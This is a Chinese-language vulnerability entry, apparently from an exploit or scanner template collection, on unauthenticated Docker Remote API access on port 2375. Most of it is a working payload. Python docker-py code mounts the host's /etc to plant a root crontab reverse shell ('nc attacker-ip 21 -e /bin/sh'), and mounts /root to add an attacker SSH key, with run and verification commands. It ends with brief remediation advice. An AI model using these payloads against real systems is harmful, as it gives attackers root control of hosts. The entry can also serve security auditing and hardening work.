---
id: DOCKER-UNAUTHORIZED-RCE
title: Docker Remote API 未授权访问导致RCE
product: docker
vendor: Docker
version_affected: "all versions"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["Docker", "dockerd"]
---

## 漏洞描述

Docker守护进程提供REST API允许远程管理。当dockerd配置为监听TCP端口2375且未启用认证时，攻击者可未经授权访问API，创建容器并挂载主机目录实现RCE。

## 影响版本

- 所有启用2375端口且未认证的Docker环境

## 前置条件

- Docker守护进程监听2375端口
- 未启用TLS认证

## 利用步骤

1. 发现2375端口开放
2. 使用docker-py创建容器并挂载/etc目录
3. 写入crontab反弹shell

## Payload

```python
import docker

client = docker.DockerClient(base_url='http://target:2375/')

# 方法1: 挂载目录写crontab
data = client.containers.run('alpine:latest',
    r'''sh -c "echo '* * * * * /usr/bin/nc attacker-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''',
    remove=True,
    volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})

# 方法2: 写入SSH key
client.containers.run('alpine:latest',
    r'''sh -c "echo 'ssh-rsa AAAAB3...' >> /tmp/root/.ssh/authorized_keys" ''',
    remove=True,
    volumes={'/root': {'bind': '/tmp/root', 'mode': 'rw'}})
```

```bash
# 直接利用
python exploit.py target-ip attacker-ip
```

## 验证方法

```bash
# 检查API是否可访问
curl http://target:2375/version

# 检查容器是否创建
docker -H tcp://target:2375 ps
```

## 修复建议

1. 禁用Docker Remote API的TCP监听
2. 启用TLS认证保护API
3. 防火墙限制2375端口访问
4. 使用Unix socket代替TCP
